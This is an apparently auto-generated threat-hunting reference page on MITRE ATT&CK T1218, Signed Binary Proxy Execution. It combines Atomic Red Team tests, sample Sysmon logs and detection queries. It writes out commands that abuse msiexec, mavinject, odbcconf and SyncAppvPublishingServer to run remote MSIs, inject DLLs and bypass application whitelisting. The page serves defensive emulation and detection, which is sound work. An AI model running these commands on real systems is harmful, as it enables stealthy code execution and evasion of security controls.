
# Signed Binary Proxy Execution

## Description

### MITRE Description

> Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

### Msiexec.exe
Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)

* <code>msiexec.exe /q /i "C:\path\to\file.msi"</code>
* <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>
* <code>msiexec.exe /y "C:\path\to\file.dll"</code>

### Mavinject.exe
Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

* <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
* <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>

### SyncAppvPublishingServer.exe
SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

### Odbcconf.exe
Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)

* <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>

Several other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)

## Additional Attributes

* Bypass: ['Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218

## Potential Commands

```
mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\T1218\src\x64\T1218.dll

None
SyncAppvPublishingServer.exe "n; Start-Process calc.exe"

C:\Windows\SysWow64\Register-CimProvider.exe -Path PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll

msiexec.exe /q /i "PathToAtomicsFolder\T1218\src\Win32\T1218.msi"

msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi"

msiexec.exe /y "PathToAtomicsFolder\T1218\src\x64\T1218.dll"

odbcconf.exe /S /A {REGSVR "PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll"}

InfDefaultInstall.exe PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf

mavinject.exe|SyncAppvPublishingServer.exe
Log
# Windows security log
Event ID: 4688
Process information:
New Process ID: 0xe78
New Process Name: C: \ Windows \ System32 \ msiexec.exe

# Sysmon log
Event ID: 1
UtcTime: 2020-04-18 14: 04: 16.596
ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}
ProcessId: 3704
Image: C: \ Windows \ System32 \ msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: msiexec / q / i http://192.168.126.146/1.msi
CurrentDirectory: C: \ Users \ 12306Br0 \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
LogonId: 0x6e21a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}
ParentProcessId: 1900
ParentImage: C: \ Windows \ System32 \ cmd.exe
ParentCommandLine: "C: \ Windows \ system32 \ cmd.exe"
It can be detected for the following command parameters.
Dos
 Msiexec.exe / q /i"C:\path\to\file.msi "

 Msiexec.exe / q / i http [:] // site com / file.msi [.]

 Msiexec.exe / y "C: \ path \ to \ file.dll"
Log
windows security log
Event ID: 4688
Process information:
New Process ID: 0xfec
New Process Name: C: \ Windows \ SysWOW64 \ odbcconf.exe

Event ID: 4688
Process information:
New Process ID: 0x390
New Process Name: C: \ Windows \ SysWOW64 \ rundll32.exe

sysmon log
Event ID: 1
Image: C: \ Windows \ SysWOW64 \ odbcconf.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: ODBC Driver Configuration Program
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: odbcconf.exe
CommandLine: C: \ Windows \ SysWOW64 \ odbcconf.exe / a {regsvr C: \ payload.dll}
CurrentDirectory: C: \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
LogonId: 0x6e21a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1 = B1C49B2159C237B1F2BCE2D40508113E39143F7B
ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}
ParentProcessId: 3868
ParentImage: C: \ Windows \ System32 \ cmd.exe
ParentCommandLine: "C: \ Windows \ system32 \ cmd.exe"

Event ID: 1
Image: C: \ Windows \ SysWOW64 \ rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe
CurrentDirectory: C: \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
LogonId: 0x6e21a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1 = 8939CF35447B22DD2C6E6F443446ACC1BF986D58
ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}
ParentProcessId: 4076
ParentImage: C: \ Windows \ SysWOW64 \ odbcconf.exe
ParentCommandLine: C: \ Windows \ SysWOW64 \ odbcconf.exe / a {regsvr C: \ payload.dll}
```

## Commands Dataset

```
[{'command': 'mavinject.exe #{process_id} /INJECTRUNNING '
             'PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'SyncAppvPublishingServer.exe "n; Start-Process calc.exe"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path '
             'PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'msiexec.exe /q /i '
             '"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'msiexec.exe /q /i '
             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'msiexec.exe /y '
             '"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'odbcconf.exe /S /A {REGSVR '
             '"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"}\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'InfDefaultInstall.exe '
             'PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'mavinject.exe|SyncAppvPublishingServer.exe',
  'name': None,
  'source': 'SysmonHunter - Signed Binary Proxy Execution'},
 {'command': 'Log\n'
             '# Windows security log\n'
             'Event ID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xe78\n'
             'New Process Name: C: \\ Windows \\ System32 \\ msiexec.exe\n'
             '\n'
             '# Sysmon log\n'
             'Event ID: 1\n'
             'UtcTime: 2020-04-18 14: 04: 16.596\n'
             'ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}\n'
             'ProcessId: 3704\n'
             'Image: C: \\ Windows \\ System32 \\ msiexec.exe\n'
             'FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\n'
             'Description: Windows installer\n'
             'Product: Windows Installer - Unicode\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: msiexec.exe\n'
             'CommandLine: msiexec / q / i http://192.168.126.146/1.msi\n'
             'CurrentDirectory: C: \\ Users \\ 12306Br0 \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\n'
             'LogonId: 0x6e21a\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: Medium\n'
             'Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\n'
             'ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}\n'
             'ParentProcessId: 1900\n'
             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'ParentCommandLine: "C: \\ Windows \\ system32 \\ cmd.exe"',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'It can be detected for the following command parameters.',
  'name': 'It can be detected for the following command parameters.',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Dos\n'
             ' Msiexec.exe / q /i"C:\\path\\to\\file.msi "\n'
             '\n'
             ' Msiexec.exe / q / i http [:] // site com / file.msi [.]\n'
             '\n'
             ' Msiexec.exe / y "C: \\ path \\ to \\ file.dll"',
  'name': 'Dos',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Log\n'
             'windows security log\n'
             'Event ID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xfec\n'
             'New Process Name: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n'
             '\n'
             'Event ID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x390\n'
             'New Process Name: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\n'
             '\n'
             'sysmon log\n'
             'Event ID: 1\n'
             'Image: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: ODBC Driver Configuration Program\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: odbcconf.exe\n'
             'CommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a '
             '{regsvr C: \\ payload.dll}\n'
             'CurrentDirectory: C: \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\n'
             'LogonId: 0x6e21a\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: Medium\n'
             'Hashes: SHA1 = B1C49B2159C237B1F2BCE2D40508113E39143F7B\n'
             'ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}\n'
             'ParentProcessId: 3868\n'
             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'ParentCommandLine: "C: \\ Windows \\ system32 \\ cmd.exe"\n'
             '\n'
             'Event ID: 1\n'
             'Image: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: Windows host process (Rundll32)\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: RUNDLL32.EXE\n'
             'CommandLine: rundll32.exe\n'
             'CurrentDirectory: C: \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\n'
             'LogonId: 0x6e21a\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: Medium\n'
             'Hashes: SHA1 = 8939CF35447B22DD2C6E6F443446ACC1BF986D58\n'
             'ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}\n'
             'ParentProcessId: 4076\n'
             'ParentImage: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n'
             'ParentCommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a '
             '{regsvr C: \\ payload.dll}',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Signed Binary Proxy Execution Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3and (process_path contains '
           '"certutil.exe"or process_command_line contains '
           '"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*"or '
           'process_path contains "*\\\\replace.exe")'},
 {'name': 'Signed Binary Proxy Execution Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"mavinject*\\\\/injectrunning"or process_command_line contains '
           '"mavinject32*\\\\/injectrunning*"or process_command_line contains '
           '"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*"or '
           'process_command_line contains '
           '"*certutil*script\\\\:https\\\\[\\\\:\\\\]\\\\/\\\\/*"or '
           'process_command_line contains '
           '"*msiexec*http\\\\[\\\\:\\\\]\\\\/\\\\/*"or process_command_line '
           'contains "*msiexec*https\\\\[\\\\:\\\\]\\\\/\\\\/*")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution': {'atomic_tests': [{'dependencies': [{'description': 'T1218.dll '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{dll_payload})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{dll_payload}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{dll_payload}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{dll_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Injects '
                                                                                            'arbitrary '
                                                                                            'DLL '
                                                                                            'into '
                                                                                            'running '
                                                                                            'process '
                                                                                            'specified '
                                                                                            'by '
                                                                                            'process '
                                                                                            'ID. '
                                                                                            'Requires '
                                                                                            'Windows '
                                                                                            '10.\n',
                                                                             'executor': {'command': 'mavinject.exe '
                                                                                                     '#{process_id} '
                                                                                                     '/INJECTRUNNING '
                                                                                                     '#{dll_payload}\n',
                                                                                          'elevation_required': True,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll',
                                                                                                                 'description': 'DLL '
                                                                                                                                'to '
                                                                                                                                'inject',
                                                                                                                 'type': 'Path'},
                                                                                                 'process_id': {'default': 1000,
                                                                                                                'description': 'PID '
                                                                                                                               'of '
                                                                                                                               'process '
                                                                                                                               'receiving '
                                                                                                                               'injection',
                                                                                                                'type': 'string'}},
                                                                             'name': 'mavinject '
                                                                                     '- '
                                                                                     'Inject '
                                                                                     'DLL '
                                                                                     'into '
                                                                                     'running '
                                                                                     'process',
                                                                             'supported_platforms': ['windows']},
                                                                            {'description': 'Executes '
                                                                                            'arbitrary '
                                                                                            'PowerShell '
                                                                                            'code '
                                                                                            'using '
                                                                                            'SyncAppvPublishingServer.exe. '
                                                                                            'Requires '
                                                                                            'Windows '
                                                                                            '10.\n',
                                                                             'executor': {'command': 'SyncAppvPublishingServer.exe '
                                                                                                     '"n; '
                                                                                                     '#{powershell_code}"\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'powershell_code': {'default': 'Start-Process '
                                                                                                                                'calc.exe',
                                                                                                                     'description': 'PowerShell '
                                                                                                                                    'code '
                                                                                                                                    'to '
                                                                                                                                    'execute',
                                                                                                                     'type': 'string'}},
                                                                             'name': 'SyncAppvPublishingServer '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'arbitrary '
                                                                                     'PowerShell '
                                                                                     'code',
                                                                             'supported_platforms': ['windows']},
                                                                            {'dependencies': [{'description': 'T1218-2.dll '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{dll_payload})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{dll_payload}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{dll_payload}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{dll_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Execute '
                                                                                            'arbitrary '
                                                                                            'dll. '
                                                                                            'Requires '
                                                                                            'at '
                                                                                            'least '
                                                                                            'Windows '
                                                                                            '8/2012. '
                                                                                            'Also '
                                                                                            'note '
                                                                                            'this '
                                                                                            'dll '
                                                                                            'can '
                                                                                            'be '
                                                                                            'served '
                                                                                            'up '
                                                                                            'via '
                                                                                            'SMB\n',
                                                                             'executor': {'command': 'C:\\Windows\\SysWow64\\Register-CimProvider.exe '
                                                                                                     '-Path '
                                                                                                     '#{dll_payload}\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll',
                                                                                                                 'description': 'DLL '
                                                                                                                                'to '
                                                                                                                                'execute',
                                                                                                                 'type': 'Path'}},
                                                                             'name': 'Register-CimProvider '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'evil '
                                                                                     'dll',
                                                                             'supported_platforms': ['windows']},
                                                                            {'dependencies': [{'description': 'T1218.msi '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{msi_payload})\n',
                                                                                               'get_prereq_command': 'Write-Host '
                                                                                                                     '"You '
                                                                                                                     'must '
                                                                                                                     'provide '
                                                                                                                     'your '
                                                                                                                     'own '
                                                                                                                     'MSI"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{msi_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Execute '
                                                                                            'arbitrary '
                                                                                            'MSI '
                                                                                            'file. '
                                                                                            'Commonly '
                                                                                            'seen '
                                                                                            'in '
                                                                                            'application '
                                                                                            'installation. '
                                                                                            'The '
                                                                                            'MSI '
                                                                                            'opens '
                                                                                            'notepad.exe '
                                                                                            'when '
                                                                                            'sucessfully '
                                                                                            'executed.\n',
                                                                             'executor': {'command': 'msiexec.exe '
                                                                                                     '/q '
                                                                                                     '/i '
                                                                                                     '"#{msi_payload}"\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'msi_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi',
                                                                                                                 'description': 'MSI '
                                                                                                                                'file '
                                                                                                                                'to '
                                                                                                                                'execute',
                                                                                                                 'type': 'Path'}},
                                                                             'name': 'Msiexec.exe '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'Local '
                                                                                     'MSI '
                                                                                     'file',
                                                                             'supported_platforms': ['windows']},
                                                                            {'description': 'Execute '
                                                                                            'arbitrary '
                                                                                            'MSI '
                                                                                            'file '
                                                                                            'retrieved '
                                                                                            'remotely. '
                                                                                            'Less '
                                                                                            'commonly '
                                                                                            'seen '
                                                                                            'in '
                                                                                            'application '
                                                                                            'installation, '
                                                                                            'commonly '
                                                                                            'seen '
                                                                                            'in '
                                                                                            'malware '
                                                                                            'execution. '
                                                                                            'The '
                                                                                            'MSI '
                                                                                            'opens '
                                                                                            'notepad.exe '
                                                                                            'when '
                                                                                            'sucessfully '
                                                                                            'executed.\n',
                                                                             'executor': {'command': 'msiexec.exe '
                                                                                                     '/q '
                                                                                                     '/i '
                                                                                                     '"#{msi_payload}"\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'msi_payload': {'default': 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi',
                                                                                                                 'description': 'MSI '
                                                                                                                                'file '
                                                                                                                                'to '
                                                                                                                                'execute',
                                                                                                                 'type': 'String'}},
                                                                             'name': 'Msiexec.exe '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'Remote '
                                                                                     'MSI '
                                                                                     'file',
                                                                             'supported_platforms': ['windows']},
                                                                            {'dependencies': [{'description': 'T1218.dll '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{dll_payload})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{dll_payload}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{dll_payload}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{dll_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Execute '
                                                                                            'arbitrary '
                                                                                            'DLL '
                                                                                            'file '
                                                                                            'stored '
                                                                                            'locally. '
                                                                                            'Commonly '
                                                                                            'seen '
                                                                                            'in '
                                                                                            'application '
                                                                                            'installation.\n'
                                                                                            'Upon '
                                                                                            'execution, '
                                                                                            'a '
                                                                                            'window '
                                                                                            'titled '
                                                                                            '"Boom!" '
                                                                                            'will '
                                                                                            'open '
                                                                                            'that '
                                                                                            'says '
                                                                                            '"Locked '
                                                                                            'and '
                                                                                            'Loaded!". '
                                                                                            'For '
                                                                                            '32 '
                                                                                            'bit '
                                                                                            'systems '
                                                                                            'change '
                                                                                            'the '
                                                                                            'dll_payload '
                                                                                            'argument '
                                                                                            'to '
                                                                                            'the '
                                                                                            'Win32 '
                                                                                            'folder.\n'
                                                                                            'By '
                                                                                            'default, '
                                                                                            'if '
                                                                                            'the '
                                                                                            'src '
                                                                                            'folder '
                                                                                            'is '
                                                                                            'not '
                                                                                            'in '
                                                                                            'place, '
                                                                                            'it '
                                                                                            'will '
                                                                                            'download '
                                                                                            'the '
                                                                                            '64 '
                                                                                            'bit '
                                                                                            'version.\n',
                                                                             'executor': {'command': 'msiexec.exe '
                                                                                                     '/y '
                                                                                                     '"#{dll_payload}"\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll',
                                                                                                                 'description': 'DLL '
                                                                                                                                'to '
                                                                                                                                'execute',
                                                                                                                 'type': 'Path'}},
                                                                             'name': 'Msiexec.exe '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'Arbitrary '
                                                                                     'DLL',
                                                                             'supported_platforms': ['windows']},
                                                                            {'dependencies': [{'description': 'T1218-2.dll '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{dll_payload})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{dll_payload}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{dll_payload}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{dll_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Execute '
                                                                                            'arbitrary '
                                                                                            'DLL '
                                                                                            'file '
                                                                                            'stored '
                                                                                            'locally.\n',
                                                                             'executor': {'command': 'odbcconf.exe '
                                                                                                     '/S '
                                                                                                     '/A '
                                                                                                     '{REGSVR '
                                                                                                     '"#{dll_payload}"}\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll',
                                                                                                                 'description': 'DLL '
                                                                                                                                'to '
                                                                                                                                'execute',
                                                                                                                 'type': 'Path'}},
                                                                             'name': 'Odbcconf.exe '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'Arbitrary '
                                                                                     'DLL',
                                                                             'supported_platforms': ['windows']},
                                                                            {'dependencies': [{'description': 'INF '
                                                                                                              'file '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{inf_to_execute})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{inf_to_execute}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{inf_to_execute}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{inf_to_execute}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Test '
                                                                                            'execution '
                                                                                            'of '
                                                                                            'a '
                                                                                            '.inf '
                                                                                            'using '
                                                                                            'InfDefaultInstall.exe\n'
                                                                                            '\n'
                                                                                            'Reference: '
                                                                                            'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n',
                                                                             'executor': {'command': 'InfDefaultInstall.exe '
                                                                                                     '#{inf_to_execute}\n',
                                                                                          'elevation_required': False,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf',
                                                                                                                    'description': 'Local '
                                                                                                                                   'location '
                                                                                                                                   'of '
                                                                                                                                   'inf '
                                                                                                                                   'file',
                                                                                                                    'type': 'string'}},
                                                                             'name': 'InfDefaultInstall.exe '
                                                                                     '.inf '
                                                                                     'Execution',
                                                                             'supported_platforms': ['windows']}],
                                                           'attack_technique': 'T1218',
                                                           'display_name': 'Signed '
                                                                           'Binary '
                                                                           'Proxy '
                                                                           'Execution'}},
 {'SysmonHunter - T1218': {'description': None,
                           'level': 'medium',
                           'name': 'Signed Binary Proxy Execution',
                           'phase': 'Execution',
                           'query': [{'process': {'any': {'pattern': 'mavinject.exe|SyncAppvPublishingServer.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [Cobalt Group](../actors/Cobalt-Group.md)

* [Rancor](../actors/Rancor.md)
    
* [TA505](../actors/TA505.md)
